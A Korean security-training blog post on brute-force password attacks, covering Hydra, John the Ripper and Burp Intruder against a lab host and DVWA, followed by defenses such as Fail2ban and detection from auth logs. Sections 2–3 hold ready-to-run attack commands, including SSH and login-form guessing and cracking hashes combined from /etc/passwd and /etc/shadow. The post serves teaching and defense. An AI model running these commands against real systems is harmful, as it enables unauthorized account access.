---
layout: post
title: "Brute Force 공격 실습"
date: 2025-11-03 17:00:00 +0900
categories: [hacking-tools]
---

## 1. 개념

**Brute Force (무차별 대입 공격)**는 가능한 모든 비밀번호 조합을 시도하여 인증을 돌파하는 공격 기법입니다.

### 관련 도구

| 도구 | 용도 |
|------|------|
| Hydra | 네트워크 서비스 (SSH, FTP, HTTP 등) |
| John the Ripper | 오프라인 해시 크래킹 |
| Hashcat | GPU 기반 해시 크래킹 |
| Burp Suite Intruder | 웹 폼 공격 |

### 공격 유형

| 유형 | 설명 |
|------|------|
| Dictionary Attack | 사전 파일 사용 (rockyou.txt 등) |
| Pure Brute Force | 모든 문자 조합 시도 |
| Hybrid | 사전 + 규칙 적용 (password → Password1!) |
| Credential Stuffing | 유출된 ID/PW 조합 재사용 |

---

## 2. 사용법

### Hydra - SSH 공격
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.0.0.11 ssh
```

| 옵션 | 설명 |
|------|------|
| `-l` | 단일 사용자명 |
| `-L` | 사용자명 사전 파일 |
| `-p` | 단일 비밀번호 |
| `-P` | 비밀번호 사전 파일 |
| `-t` | 동시 연결 수 |

### Hydra - 웹 폼 공격
```bash
hydra -l admin -P passwords.txt 10.0.0.11 http-post-form \
"/login.php:username=^USER^&password=^PASS^:Login failed"
```

### John the Ripper - 해시 크래킹
```bash
# Shadow 파일 크래킹
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

---

## 3. 실습 예시

### DVWA Brute Force
1. Burp Suite로 로그인 요청 캡처
2. Intruder로 전송 (Ctrl+I)
3. 비밀번호 파라미터에 `§` 표시
4. Payloads 탭에서 사전 파일 로드
5. Attack 시작
6. 응답 길이가 다른 항목 = 성공한 비밀번호

### SSH Brute Force (Hydra)
```bash
# 실습 환경
hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 10.0.0.11 ssh

# 결과
[22][ssh] host: 10.0.0.11   login: user   password: password123
```

---

## 4. 방어 대책

| 대책 | 설명 |
|------|------|
| 계정 잠금 | N회 실패 시 계정 잠금 |
| Rate Limiting | 로그인 시도 횟수 제한 |
| CAPTCHA | 자동화 공격 방지 |
| 2FA/MFA | 다중 인증 요구 |
| 강력한 비밀번호 정책 | 복잡도, 길이 요구 |
| Fail2ban | IP 기반 차단 |

### Fail2ban 설정 예시
```bash
# /etc/fail2ban/jail.local
[sshd]
enabled = true
maxretry = 3
bantime = 3600
findtime = 600
```

---

## 5. 탐지 방법

### 로그 분석
```bash
# SSH 실패 로그
grep "Failed password" /var/log/auth.log

# 다수 실패 IP 확인
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
```

### 모니터링 지표
- 짧은 시간 내 다수 로그인 실패
- 동일 IP에서 여러 계정 시도
- 비정상적인 시간대 로그인 시도

<hr class="short-rule">
